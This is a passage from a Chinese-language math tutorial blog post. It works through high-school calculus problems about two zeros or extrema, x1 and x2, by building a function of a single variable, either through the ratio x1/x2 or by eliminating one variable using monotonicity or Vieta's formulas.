<p>当 <span class="math inline">\(m &gt;= \frac{3\sqrt{2}}{2}\)</span> 时有 <span class="math inline">\(\Delta &gt; 0\)</span></p>
<p>由韦达定理：</p>
<p><span class="math display">\[
\begin{cases}
x_1 + x_2 = m \\
x_1x_2 = 1
\end{cases}
\]</span></p>
<p>故：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; (x_1 + x_2)^2 = m^2 \\
&amp; \Rightarrow x_1^2 + x_2^2 = m^2 - 2x_1x_2 = m^2 -2 \\  
&amp; \Rightarrow \frac{x_1^2 + x_2^2}{x_1x_2} = m^2 - 2 \ge (\frac{3\sqrt{2}}{2})^2 - 2 = \frac{5}{2} \\
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\therefore \frac{x_1}{x_2} + \frac{x_2}{x_1} - \frac{5}{2} \ge 0
\]</span></p>
<p>令 <span class="math inline">\(t = \frac{x_1}{x_2}\)</span>, <span class="math inline">\(\therefore t \in (0,1)\)</span>，有：</p>
<p><span class="math display">\[
t + \frac{1}{t} - \frac{5}{2} \ge 0
\]</span></p>
<p>解得 <span class="math inline">\(t \ge 2\)</span> (舍去) 或 <span class="math inline">\(t \le \frac{1}{2}\)</span></p>
<p><span class="math display">\[
\therefore t \in (0,\frac{1}{2}]
\]</span></p>
<p><span class="math inline">\(\because x_1\)</span>, <span class="math inline">\(x_2\)</span> 是 <span class="math inline">\(h(x)\)</span>两零点，故：</p>
<p><span class="math display">\[
\begin{cases}
\ln x_1 - cx_1^2 - bx_1 = 0 \\
\ln x_2 - cx_2^2 - bx_2 = 0
\end{cases}
\]</span></p>
<p>两式相减：</p>
<p><span class="math display">\[
\ln\frac{x_1}{x_2} - c(x_1^2 - x_2^2) - b(x_1 - x_2) = 0
\]</span></p>
<p>化简得：</p>
<p><span class="math display">\[
c(x_1 + x_2) + b = \frac{\ln\frac{x_1}{x_2}}{x_1 - x_2}
\]</span></p>
<p>则：</p>
<p><span class="math display">\[
\begin{aligned}
y &amp; = (x_1 - x_2)h&#39;(\frac{x_1 + x_2}{2}) \\
  &amp; = (x_1 - x_2)\left[\frac{2}{x_1 + x_2} - c(x_1 + x_2) - b\right] \\
  &amp; = (x_1 - x_2)(\frac{2}{x_1 + x_2} - \frac{\ln\frac{x_1}{x_2}}{x_1 - x_2}) \\
  &amp; = \frac{2(x_1 - x_2)}{x_1 + x_2} - \ln\frac{x_1}{x_2} \\
  &amp; = \frac{2(\frac{x_1}{x_2} - 1)}{\frac{x_1}{x_2} + 1} - \ln\frac{x_1}{x_2} \\
  &amp; = \frac{2(t - 1)}{t + 1} - \ln t \\
\\
\therefore y&#39; &amp; = \frac{4}{(t + 1)^2} - \frac{1}{t} \\
   &amp; = -\frac{(t - 1)^2}{t(t + 1)^2} &lt; 0
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore y\)</span> 在 <span class="math inline">\((0,\frac{1}{2})\)</span> 单调递减</p>
<p><span class="math inline">\(\therefore t = \frac{1}{2}\)</span> 时有最小 <span class="math inline">\(y = \ln2 - \frac{2}{3}\)</span></p>
<p>答：<span class="math inline">\(y\)</span> 的最小值为 <span class="math inline">\(\ln2 - \frac{2}{3}\)</span>。</p>
<p>该题稍稍有点难度的地方在于，如果直接按 1 题的方法做的话会发现 <span class="math inline">\(m\)</span> 取值范围的条件用不上，而能把 <span class="math inline">\(m\)</span> 和 <span class="math inline">\(x_1,x_2\)</span> 联系在一起的也只有韦达定理了。故该题在 1 题的基础上还利用了韦达定理作为条件。</p>
<p><strong>注： 其实本题还可以由<span class="math inline">\(x_2 = \frac{1}{x_1}\)</span>做出</strong>。</p>
<hr />
<p>好的，现在我们暂且先对上面两道题做一个小结：</p>
<ul>
<li>对于<strong>零点</strong>: <span class="math inline">\(f(x_1) = f(x_2) = 0\)</span>，如果 <span class="math inline">\(f(x)\)</span> 是二次函数的话还有韦达定理。</li>
<li>对于<strong>极值</strong>: <span class="math inline">\(f&#39;(x_1) = f&#39;(x_2) = 0\)</span>，如果 <span class="math inline">\(f&#39;(x)\)</span> 是二次函数的话也有韦达定理。</li>
</ul>
<p>接下来再对如何利用隐含条件来帮助构造以 <span class="math inline">\(\frac{x_1}{x_2}\)</span> 为单一变量新函数的方法做一个小结：</p>
<ul>
<li><strong>对数</strong>型（以 <span class="math inline">\(\ln x\)</span> 为例）： 两式<strong>相减</strong>构造 <span class="math inline">\(\ln\frac{x_1}{x_2}\)</span>。</li>
<li><strong>指数</strong>型（以 <span class="math inline">\(e^x\)</span> 为例）：两式<strong>相除</strong>构造 <span class="math inline">\(e^\frac{x_1}{x_2}\)</span>，视情况可等号两边取对数（<span class="math inline">\(\ln\)</span>）以简化解题。</li>
<li><strong>二次函数</strong>型: 先由<strong>韦达定理</strong>表示出 <span class="math inline">\(x_1 + x_2\)</span> 和 <span class="math inline">\(x_1x_2\)</span>，很容易可以表示出 <span class="math inline">\(x_1^2 + x_2^2\)</span>，然后除以 <span class="math inline">\(x_1x_2\)</span>，即 <span class="math inline">\(\frac{x_1^2 + x_2^2}{x_1x_2} = \frac{x_1}{x_2} + \frac{x_2}{x_1}\)</span>。</li>
</ul>
<p><strong>注意事项</strong>：</p>
<ul>
<li>构造 <span class="math inline">\(\frac{x_1}{x_2}\)</span> 就是在构造新参数，其优点是 <span class="math inline">\(x_1\)</span> 和 <span class="math inline">\(x_2\)</span> 的大小关系往往已知，于是新参数 <span class="math inline">\(t = \frac{x_1}{x_2}\)</span> 的取值范围也就确定了【若 <span class="math inline">\(x_1 &gt; x_2\)</span> 则 <span class="math inline">\(t \in (1, +\infty)\)</span>；若 <span class="math inline">\(x_1 &lt; x_2\)</span> 则 <span class="math inline">\(t \in (0, 1]\)</span>。我个人喜欢把较小的放在分子以避免可能出现的讨论 <span class="math inline">\(x = +\infty\)</span> 的情况。</li>
<li>另外，如果题中带求证的式子中含有 <span class="math inline">\(x_1 + x_2\)</span>、<span class="math inline">\(x_1x_2\)</span>、<span class="math inline">\(x_1^2 + x_2^2\)</span> 等不好处理的项时往往也可以用隐含条件构造它们把它们换为利于处理的式子。</li>
</ul>
</div>
<div id="直接构造新变量" class="section level2">
<h2>直接构造新变量</h2>
<p>其实我本来想把这一小节放在第一个的，但无奈这道例题太球难算了。由于不希望读者一来就看到这道例题从而对这篇文章产生不好的印象，我选择将这一小节放在第一类方法的最后一个介绍。</p>
<p><strong>3.</strong> (2016.成外一诊模拟文) 已知函数 <span class="math inline">\(f(x) = x\ln x\)</span>，设 <span class="math inline">\(A(x_1,f(x_1))\)</span>, <span class="math inline">\(B(x_2,f(x_2))\)</span>，且 <span class="math inline">\(x_1 \neq x_2\)</span>，求证: <span class="math inline">\(\frac{f(x_2) - f(x_1)}{x_2 - x_1} &lt; f&#39;(\frac{x_1 + x_2}{2})\)</span>。</p>
<p><strong>证明</strong>：</p>
<p><em>注：为了体现本人的思考流程，本题的我写的格式可能会比较奇葩，求轻喷…</em></p>
<p>令 <span class="math inline">\(x_1 &lt; x_2\)</span>，则 <span class="math inline">\(\frac{x_1}{x_2} \in (0,1)\)</span></p>
<p><span class="math display">\[
\begin{aligned}
&amp; \frac{f(x_2) - f(x_1)}{x_2 - x_1} &lt; f&#39;(\frac{x_1 + x_2}{2}) \\
&amp; \Leftrightarrow \frac{x_2\ln x_2 - x_1\ln x_1}{x_2 - x_1} &lt; \ln(\frac{x_1 + x_2}{2}) + 1 \\
&amp; \Leftrightarrow \frac{\ln x_2 - \frac{x_1}{x_2}\ln x_1}{1 - \frac{x_1}{x_2}} - 1 &lt;  \ln(\frac{x_1 + x_2}{2}) \\
&amp; \Leftrightarrow \ln x_2 - \frac{x_1}{x_2}\ln x_1 - \frac{x_1}{x_2} + 1 &lt; (1 - \frac{x_1}{x_2})\ln(\frac{x_1 + x_2}{2}) \\
&amp; \Leftrightarrow \ln x_2 - 1 - \frac{x_1}{x_2}(\ln x_1 - 1) &lt; (1 - \frac{x_1}{x_2})\ln(\frac{x_1 + x_2}{2})
\end{aligned}
\]</span></p>
<p><em>插一句话：我们发现 <span class="math inline">\(\frac{x_1 + x_2}{2}\)</span> 真是特别讨厌，无法构造出以 <span class="math inline">\(\frac{x_1}{x_2}\)</span> 为单一变量的式子。但是我们可以在不等号两边同时减去 <span class="math inline">\((1 - \frac{x_1}{x_2})\ln x_2\)</span>，使得不等号右边变为 <span class="math inline">\((1 - \frac{x_1}{x_2} )\ln(\frac{x_1 + x_2}{2x_2})\)</span>。这样就可以化为 <span class="math inline">\((1 - \frac{x_1}{x_2})\ln(\frac{\frac{x_1}{x_2} + 1}{2})\)</span>了</em>。</p>
<p><span class="math display">\[
\begin{aligned}
&amp; \Leftrightarrow \ln x_2 - 1 - \frac{x_1}{x_2}(\ln x_1 - 1) - (1 - \frac{x_1}{x_2})\ln x_2 &lt; (1 - \frac{x_1}{x_2})\ln(\frac{x_1 + x_2}{2}) - (1 - \frac{x_1}{x_2})\ln x_2 \\
&amp; \Leftrightarrow \frac{x_1}{x_2}\ln x_2 - \frac{x_1}{x_2}\ln x_1 + \frac{x_1}{x_2} - 1 &lt; (1 - \frac{x_1}{x_2})\ln(\frac{\frac{x_1}{x_2} + 1}{2}) \\
&amp; \Leftrightarrow \frac{x_1}{x_2} - \frac{x_1}{x_2}\ln\frac{x_1}{x_2} - 1 &lt; (1 - \frac{x_1}{x_2})\ln(\frac{\frac{x_1}{x_2} + 1}{2}) \\
&amp; \Leftrightarrow \frac{x_1}{x_2} - \frac{x_1}{x_2}\ln\frac{x_1}{x_2} - (1 - \frac{x_1}{x_2})\ln(\frac{\frac{x_1}{x_2} + 1}{2}) - 1 &lt; 0
\end{aligned}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
t = \frac{x_1}{x_2} \in (0,1)
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
F(t) &amp; = t - t\ln t - (1-t)\ln(\frac{t+1}{2})-1 \\
     &amp; = t\ln(\frac{t+1}{2t}) - \ln(\frac{t+1}{2}) +t - 1 \\
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\therefore F&#39;(t) = \ln(\frac{t+1}{2t}) - \frac{2}{t+1} + 1
\]</span></p>
<p><em>再插一句话： 然而这个样子还是不好看，应当考虑再次求导法… 不过再次求导前我们先观察一下 <span class="math inline">\(F&#39;(t)\)</span> 这个式子了。很容易发现（别打我…) <span class="math inline">\(\frac{2}{t+1} = 2 - \frac{2t}{t+1} = 2 - \frac{1}{\frac{t+1}{2t}}\)</span>。 不如我们令 <span class="math inline">\(k = \frac{t+1}{2t}\)</span>，然后把 <span class="math inline">\(\frac{2}{t+1}\)</span> 表示为 <span class="math inline">\(2 - \frac{1}{k}\)</span> 来方便求导</em>。</p>
<p>令：</p>
<p><span class="math display">\[
k = \frac{t+1}{2t}
\]</span></p>
<p><span class="math display">\[
\therefore \frac{2}{t+1} = 2 - \frac{1}{k}
\]</span></p>
<p>由 <span class="math inline">\(t \in (0,1)\)</span>，则：</p>
<p><span class="math display">\[
t+1 &gt; 2t, \ k &gt; 1
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
\varphi(k) = \ln k - 1 + \frac{1}{k}
\]</span></p>
<p><span class="math display">\[
\therefore \varphi&#39;(k) = \frac{1}{k} - \frac{1}{k^2} = \frac{k - 1}{k^2} &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore \varphi(k)\)</span> 在 <span class="math inline">\((1, +\infty)\)</span> 单调递增，则：</p>
<p><span class="math display">\[
\varphi(k) &gt; \varphi(1) = 0
\]</span></p>
<p><span class="math inline">\(\therefore t \in (0,1)\)</span> 时有 <span class="math inline">\(F&#39;(t) &gt; 0\)</span> 恒成立</p>
<p><span class="math inline">\(\therefore F(t)\)</span> 在 <span class="math inline">\((0,1)\)</span> 单调递增，则：</p>
<p><span class="math display">\[
\therefore F(t) &lt; F(1) = 0
\]</span></p>
<p>即：</p>
<p><span class="math display">\[
\frac{x_1}{x_2} - \frac{x_1}{x_2}\ln\frac{x_1}{x_2} - (1 - \frac{x_1}{x_2})\ln(\frac{\frac{x_1}{x_2} + 1}{2}) - 1 &lt; 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 得证</p>
<p>是不是很爽？不过这道题难度的确够大的，两个插话的地方都是思维难点而且我当时想了好久才想出来（怪我蠢）。这道题的思路依旧是构造以 <span class="math inline">\(t = \frac{x_1}{x_2}\)</span> 为单一变量的新函数，并化简到类似 <span class="math inline">\(F(t) &gt; 0\)</span> 的形式，然后通过对新函数求导来解决问题。</p>
</div>
</div>
<div id="消去旧变量" class="section level1">
<h1>消去旧变量</h1>
<p>然而有些题目中即使用尽上一类题目中的条件也难以构造出新变量。这个时候我们就需要考虑能否通过消去两已有变量中的一者来构造单一变量的新函数。</p>
<div id="利用函数单调性" class="section level2">
<h2>利用函数单调性</h2>
<div id="利用新函数的单调性" class="section level3">
<h3>利用新函数的单调性</h3>
<p><strong>4.</strong> (2016.长春监测) 已知函数 <span class="math inline">\(f(x) = \frac{1-2\ln x}{x^2}\)</span>。若对任意 <span class="math inline">\(x_1, x_2 \in (0, \frac{1}{e}]\)</span>，有 <span class="math inline">\(|\frac{f(x_1) - f(x_2)}{x_1^2 - x_2^2}| &gt; \frac{k}{x_1^2 \cdot x_2^2}\)</span>，求<span class="math inline">\(k\)</span>的取值范围。</p>
<p><strong>解</strong>：</p>
<p><span class="math display">\[
f&#39;(x) = \frac{4\ln x - 4}{x^3}
\]</span></p>
<p><span class="math inline">\(\therefore f(x)\)</span> 在 <span class="math inline">\((0,\frac{1}{e}]\)</span> 单调递减。</p>
<p>令 <span class="math inline">\(x_1 &lt; x_2\)</span>，有：</p>
<p><span class="math display">\[
x_1 - x_2 &lt; 0, \ f(x_1) &gt; f(x_2)
\]</span></p>
<p>由题：</p>
<p><span class="math display">\[
-\frac{f(x_1)-f(x_2)}{(x_1+x_2)(x_1-x_2)} &gt; \frac{k}{(x_1x_2)^2}
\]</span></p>
<p>化简得：</p>
<p><span class="math display">\[
\frac{1-2\ln x_1}{x_1^2}-\frac{k}{x_1^2} &gt; \frac{1-2\ln x_2}{x_2^2}-\frac{k}{x_2^2}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
F(x) = \frac{1-2\ln x_1-k}{x_1^2}
\]</span></p>
<p><span class="math display">\[
\therefore F(x_1) &gt; F(x_2)
\]</span></p>
<p><span class="math inline">\(\therefore F(x)\)</span> 在 <span class="math inline">\((0,\frac{1}{e}]\)</span> 单调递减</p>
<p><span class="math display">\[
\therefore F&#39;(x) = \frac{4\ln x + 2k - 4}{x^3} \le 0
\]</span></p>
<p><span class="math display">\[
\because x^3 &gt; 0
\]</span></p>
<p><span class="math display">\[
\therefore 4\ln x + 2k - 4 \le 0
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
\varphi(x) = 4\ln x + 2k - 4
\]</span></p>
<p><span class="math display">\[
\therefore \varphi&#39;(x) = \frac{4}{x}
\]</span></p>
<p>当 <span class="math inline">\(x \in (0,\frac{1}{e}]\)</span> 时：</p>
<p><span class="math display">\[
\varphi&#39;(x) &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore \varphi(x)\)</span> 在 <span class="math inline">\((0,\frac{1}{e}]\)</span> 上单调递增，则：</p>
<p><span class="math display">\[
\varphi(x)max = \varphi(\frac{1}{e}) = 2k - 8 \le 0
\]</span></p>
<p>解得：</p>
<p><span class="math display">\[
k \in (-\infty,4]
\]</span></p>
<p>答：<span class="math inline">\(k\)</span> 的取值范围为 <span class="math inline">\((-\infty,4]\)</span>。</p>
<p>我们解决这道题时<strong>将不等号两边的式子化成同一函数（即类似 <span class="math inline">\(F(x_1) &gt; F(x_2)\)</span> 的形式）</strong>，从而构造了新函数 <span class="math inline">\(F(x)\)</span>。由于 <span class="math inline">\(x_1\)</span> 和 <span class="math inline">\(x_2\)</span> 大小关系已知，故新函数 <span class="math inline">\(F(x)\)</span> 的单调性也已知，就转化成对 <span class="math inline">\(F(x)\)</span> 导数正负性讨论的问题了。</p>
</div>
<div id="利用旧函数的单调性" class="section level3">
<h3>利用旧函数的单调性</h3>
<p>能造直接造新函数已经算一种极为简单的题型了，而下面的题型就要隐蔽不少。</p>
<p><strong>5.</strong> (2016.成外一诊模拟理) 已知a为实数，函数 <span class="math inline">\(f(x) = \ln x - ax + 1\)</span>，当 <span class="math inline">\(0 &lt; a &lt; 1\)</span> 时函数 <span class="math inline">\(f(x)\)</span> 有两个不同零点 <span class="math inline">\(x_1, x_2\)</span>，求证： <span class="math inline">\(x_1 + x_2 &gt; 2\)</span>。</p>
<p><em>乍一看你会觉得这与题 1 貌似没什么区别，但是一旦你顺着题 1 的方法做你就会意识到要造出 <span class="math inline">\(x_1 + x_2\)</span> 必须两式相加，而一相加后又会冒出来个 <span class="math inline">\(\ln(x_1x_2)\)</span>，既消不掉又无法构建单一变量新函数。所以本题就不能以题 1 的方法做了</em>。</p>
<p><strong>证明</strong>：</p>
<p><span class="math display">\[
f&#39;(x) = \frac{1}{x} - a = \frac{1 - ax}{x}
\]</span></p>
<table>
<thead>
<tr class="header">
<th><span class="math inline">\(x\)</span></th>
<th><span class="math inline">\((0,\frac{1}{a})\)</span></th>
<th><span class="math inline">\(\frac{1}{a}\)</span></th>
<th><span class="math inline">\((\frac{1}{a},+\infty)\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(f&#39;(x)\)</span></td>
<td>+</td>
<td>0</td>
<td>-</td>
</tr>
<tr class="even">
<td><span class="math inline">\(f(x)\)</span></td>
<td>单增</td>
<td>极大值</td>
<td>单减</td>
</tr>
</tbody>
</table>
<p>由 <span class="math inline">\(x_1 &lt; x_2\)</span>：</p>
<p><span class="math display">\[
0 &lt; x_1 &lt; \frac{1}{a}, \ x_2 &gt; \frac{1}{a}
\]</span></p>
<p><span class="math display">\[
\therefore \frac{2}{a} - x_1 &gt; \frac{1}{a}
\]</span></p>
<p><em>插一句话： 如果我能证到 <span class="math inline">\(\frac{2}{a} - x_1 &lt; x_2\)</span>，那么就一定有 <span class="math inline">\(x_1 + x_2 &gt; \frac{2}{a} &gt; 2\)</span> 了。又因为 <span class="math inline">\((\frac{2}{a} - x_1)\)</span>和 <span class="math inline">\(x_2\)</span>都 <span class="math inline">\(\in (\frac{1}{a},+\infty)\)</span>，所以只需要证得 <span class="math inline">\(f(\frac{2}{a} - x_1) &gt; f(x_2)\)</span> 就行了。又因为 <span class="math inline">\(f(x_1) = f(x_2) = 0\)</span>，所以只需证得 <span class="math inline">\(f(\frac{2}{a} - x_1) &gt; f(x_1)\)</span> 即可。于是这样 <span class="math inline">\(x_2\)</span> 就被搞掉了，我们也就可以构造新的单一变量的新函数了</em>。</p>
<p>令:</p>
<p><span class="math display">\[
\begin{aligned}
g(x) &amp; = f(\frac{2}{a} - x) - f(x) \\
     &amp; = \ln(\frac{2}{a} - x) - a(\frac{2}{a} - x) - \ln x + ax \quad (0 &lt; x \le \frac{1}{a}) \\
\\
\therefore g&#39;(x) &amp;= \frac{1}{x - \frac{2}{a}} - \frac{1}{x} + 2a \\
      &amp; = \frac{2a(x - \frac{1}{a})^2}{x(x - \frac{2}{a})} &lt; 0
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore g(x)\)</span> 在 <span class="math inline">\((0, \frac{1}{a})\)</span> 单调递减，故：</p>
<p><span class="math display">\[
g(x) &gt; g(\frac{1}{a}) = 0
\]</span></p>
<p><span class="math display">\[
\therefore g(x_1) = f(\frac{2}{a} - x_1) - f(x_1) &gt; 0
\]</span></p>
<p><span class="math display">\[
\therefore f(\frac{2}{a} - x_1) &gt; f(x_1) = 0 = f(x_2)
\]</span></p>
<p><span class="math display">\[
\therefore \frac{2}{a} - x_1 &lt; x_2
\]</span></p>
<p><span class="math display">\[
\therefore x_1 + x_2 &gt; \frac{2}{a} &gt; 2
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 得证。</p>
<p>从这道题我们可以看出，当我们难以通过变换 <span class="math inline">\(x_1, x_2\)</span> 隐含条件来构造出单一变量的新函数时，可以考虑<strong>从函数的单调性入手，将待证的不等式两边化为在同一单调区间内的两个式子</strong>，同时巧妙利用 <span class="math inline">\(f(x_1) = f(x_2) = 0\)</span> 或 <span class="math inline">\(f&#39;(x_1) = f&#39;(x_2) = 0\)</span> 消去 <span class="math inline">\(x_2\)</span> 进而构造出以 <span class="math inline">\(x_1\)</span> 为单一变量的新函数。</p>
<hr />
<p>上面一类题的构造方式相对明显，而有时我们也可以通过寻找 <span class="math inline">\(x_1\)</span> 与 <span class="math inline">\(x_2\)</span> 间的不等关系对原式进行代换/放缩来达到求证目的。</p>
<p><strong>6.</strong>(2017.Lody的补充题) 已知 <span class="math inline">\(f(x) = x - e^{\frac{x}{a}} \ (a &gt; 0)\)</span>。<br />
若 <span class="math inline">\(f(x_1) = f(x_2) = 0 \ (x_1 &lt; x_2)\)</span>，求证：<span class="math inline">\(\frac{x_1}{x_2} &lt; \frac{e}{a}\)</span>。</p>
<p><strong>证明</strong> ：</p>
<p><span class="math display">\[
f&#39;(x) = 1 - \frac{1}{a}e^{\frac{x}{a}}
\]</span></p>
<p>令 <span class="math inline">\(f&#39;(x) = 0\)</span>，有：</p>
<p><span class="math display">\[
x = a\ln a
\]</span></p>
<p>由 <span class="math inline">\(f&#39;(x) &gt; 0\)</span> 得 <span class="math inline">\(x &lt; a\ln a\)</span>，由 <span class="math inline">\(f&#39;(x) &lt; 0\)</span> 得 <span class="math inline">\(x &gt; a\ln a\)</span></p>
<p><span class="math inline">\(\therefore f(x)\)</span> 在 <span class="math inline">\((-\infty,a\ln a)\)</span> 单调递增，在 <span class="math inline">\((a\ln a,+\infty)\)</span> 单调递减</p>
<p><span class="math display">\[
\therefore f(x)_{max} = f(a\ln a) = a\ln a - a
\]</span></p>
<p>由函数有两个零点：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; f(x)_{max} &gt; 0 \\
&amp; \Rightarrow a\ln a - a &gt; 0 \\
&amp; \Rightarrow \ln a &gt; 1 \\
&amp; \Rightarrow a &gt; e
\end{aligned}
\]</span></p>
<p>故：</p>
<p><span class="math display">\[
f(a) = a - e &gt; 0
\]</span></p>
<p><span class="math display">\[
\therefore x_1 &lt; a
\]</span></p>
<p>又由：</p>
<p><span class="math display">\[
x_2 &gt; a\ln a
\]</span></p>
<p>则：</p>
<p><span class="math display">\[
x_2 - x_1 &gt; a\ln a - a
\]</span></p>
<p>由题：</p>
<p><span class="math display">\[
\begin{cases}
x_1 - e^{\frac{x_1}{a}} = 0 \\
x_2 - e^{\frac{x_2}{a}} = 0
\end{cases}
\]</span></p>
<p>经变换：</p>
<p><span class="math display">\[
\begin{cases}
x_1 = e^{\frac{x_1}{a}} \\
x_2 = e^{\frac{x_2}{a}}
\end{cases}
\]</span></p>
<p>两式相除：</p>
<p><span class="math display">\[
\frac{x_1}{x_2} = e^{\frac{x_1 - x_2}{a}}
\]</span></p>
<p>故：</p>
<p><span class="math display">\[
\begin{aligned}
\frac{x_1}{x_2}
&amp; = e^{\frac{x_1 - x_2}{a}} \\
&amp; &lt; e^{\frac{a - a\ln a}{a}} \\
&amp; = e^{1 - \ln a} \\
&amp; = \frac{e}{a}
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 得证。</p>
<p>本题事实上也是从单调性（函数性质）入手。经过求导后我们发现 <span class="math inline">\(f(x)\)</span> 的走向其实跟开口向下二次函数比较类似，故可以分析出 <span class="math inline">\(x_1, x_2\)</span> 的大小关系。最后再利用该关系对原式进行代换即可求证。</p>
</div>
</div>
<div id="利用韦达定理-1" class="section level2">
<h2>利用韦达定理</h2>
<p>利用韦达定理可以让我们找出两根间的关系，从而消去其中的一个变量。</p>
<p><strong>7.</strong> (2017.成都二诊理) 已知函数 <span class="math inline">\(f(x) = a\ln x - x + \frac{1}{x}\)</span>，其中 <span class="math inline">\(a &gt; 0\)</span>。</p>
<ol style="list-style-type: decimal">
<li>若 <span class="math inline">\(f(x)\)</span> 在 <span class="math inline">\((2, +\infty)\)</span> 上存在极值点，求 <span class="math inline">\(a\)</span> 的取值范围；<br />
</li>
<li>设 <span class="math inline">\(x_1 \in (0,1)\)</span>，<span class="math inline">\(x_2 \in (1,+\infty)\)</span>。若 <span class="math inline">\(f(x_2) - f(x_1)\)</span> 存在最大值，记为 <span class="math inline">\(M(a)\)</span>，则当 <span class="math inline">\(a \le e + \frac{1}{e}\)</span> 时，<span class="math inline">\(M(a)\)</span> 是否存在最大值？若存在，求出其最大值；若不存在，请说明理由.</li>
</ol>
<p><em>注：(1)问可以利用分离参数法或者讨论二次函数根的分布来求解，这里就略去详细过程了，我们只详细分析第(2)问</em>。</p>
<p><strong>解</strong>： (2)</p>
<p><span class="math display">\[
f&#39;(x) = \frac{-(x^2 - ax +1)}{x^2}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
\varphi(x) = x^2 - ax + 1
\]</span></p>
<p>① 若 <span class="math inline">\(0 &lt; a \le 2\)</span><br />
<span class="math inline">\(f&#39;(x)\)</span> 在 <span class="math inline">\((0,+\infty)\)</span> 上恒有 <span class="math inline">\(\varphi(x) \ge 0\)</span><br />
<span class="math inline">\(\therefore f&#39;(x) \le 0\)</span><br />
<span class="math inline">\(\therefore f(x)\)</span> 在 <span class="math inline">\((0,+\infty)\)</span> 单调递减，有：</p>
<p><span class="math display">\[
f(x_2) - f(x_1) &lt; 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 不存在最大值.</p>
<p>② 若 <span class="math inline">\(a &gt; 2\)</span></p>
<p><span class="math inline">\(\therefore \varphi(x)\)</span> 有两不等正实根，令其为 <span class="math inline">\(m, n\)</span></p>
<p>不妨设<span class="math inline">\(0 &lt; m &lt; 1 &lt; n\)</span></p>
<p><span class="math inline">\(\therefore f(x)\)</span> 在 <span class="math inline">\((0,m)\)</span> 单调递减，在 <span class="math inline">\((m,n)\)</span> 单调递增，在 <span class="math inline">\((n,+\infty)\)</span> 单调递减</p>
<p><span class="math inline">\(\therefore \forall x_1 \in (0,1)\)</span>，有 <span class="math inline">\(f(x_1) \ge f(m)\)</span>；<span class="math inline">\(\forall x_2 \in (1,+\infty)\)</span>，有 <span class="math inline">\(f(x_2) \le f(n)\)</span></p>
<p>则：</p>
<p><span class="math display">\[
[f(x_2) - f(x_1)]_{max} = f(n) - f(m)
\]</span></p>
<p>故：</p>
<p><span class="math display">\[
\begin{aligned}
M(a) &amp; = f(n) - f(m) \\
     &amp; = (a\ln n - n + \frac{1}{n}) - (a\ln m - m + \frac{1}{m}) \\
     &amp; = a\ln\frac{n}{m} + (m - n) + (\frac{1}{n} - \frac{1}{m})
\end{aligned}
\]</span></p>
<p>又由韦达定理：</p>
<p><span class="math display">\[
\begin{cases}
m + n = a \\
mn = 1
\end{cases}
\]</span></p>
<p>则：</p>
<p><span class="math display">\[
\begin{cases}
a = m + n = \frac{1}{n} + n \\
m = \frac{1}{n}
\end{cases}
\]</span></p>
<p>代入上式：</p>
<p><span class="math display">\[
\begin{aligned}
M(a) &amp; = (\frac{1}{n} + n)\ln n^2 + 2(\frac{1}{n} - n) \\
     &amp; = 2[(\frac{1}{n} + n)\ln n + (\frac{1}{n} - n)]
\end{aligned}
\]</span></p>
<p>又 <span class="math inline">\(\because 2 &lt; a \le e + \frac{1}{e}\)</span>，故：</p>
<p><span class="math display">\[
\frac{1}{n} + n \le e + \frac{1}{e}, \ n&gt;1
\]</span></p>
<p>由 <span class="math inline">\(y = x + \frac{1}{x}\)</span> 在 <span class="math inline">\(x \in (1,+\infty)\)</span> 单调递增，故：</p>
<p><span class="math display">\[
n \in (1,e]
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
h(x) = 2(\frac{1}{x} + x)\ln x + 2(\frac{1}{x} - x), \ x \in (1,e]
\]</span></p>
<p>则：</p>
<p><span class="math display">\[
\begin{aligned}
h&#39;(x)
&amp; = 2(-\frac{1}{x^2} + 1)\ln x + 2(\frac{1}{x} + x)\frac{1}{x} + 2(-\frac{1}{x^2} - 1) \\
&amp; = 2(1 - \frac{1}{x^2})\ln x
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore h(x) &gt; 0\)</span>，<span class="math inline">\(h(x)\)</span> 在 <span class="math inline">\((1, e]\)</span> 单调递增，故：</p>
<p><span class="math display">\[
h(x)_{max} = h(e) = 2(e + \frac{1}{e}) + 2(\frac{1}{e} - e) = \frac{4}{e}
\]</span></p>
<p><span class="math inline">\(\therefore M(a)\)</span> 存在最大值 <span class="math inline">\(\frac{4}{e}\)</span>。</p>
<p>答：<span class="math inline">\(M(a)\)</span> 存在最大值 <span class="math inline">\(\frac{4}{e}\)</span>。</p>
<p>这道题乍一看可能会使人懵逼… 然而其精巧之处在于 <span class="math inline">\(a &gt; 2\)</span> 时 <span class="math inline">\((0,1)\)</span> 和 <span class="math inline">\((1,+\infty)\)</span> 都一定有且只有一个极值点（由韦达定理可很方便地看出），这样便极大地简化了这道题的求解。不妨设两个极值点分别为 <span class="math inline">\(m,n\)</span>，<span class="math inline">\(M(a)\)</span> 的最大值无非就是 <span class="math inline">\(f(n) - f(m)\)</span>，再加之利用韦达定理可以轻松消去其中一者，单一变量的函数就这么构建出来了。剩下的就是求导和 enjoy 了。</p>
</div>
</div>
<div id="小结" class="section level1">
<h1>小结</h1>
<p>好的，“两点”问题的几种方法我们也算是总结完了（我的年龄和所在学校也暴露完了😂）。</p>
<p>回顾这 7 道题，我们再次感受到解决此类“两点”问题的核心即在于<strong>构建单一变量的新函数</strong>。而构造单一变量的方法无非如下两种：</p>
<ul>
<li>构造新变量（通常为<span class="math inline">\(\frac{x_1}{x_2}\)</span>）</li>
<li>消去旧变量</li>
</ul>
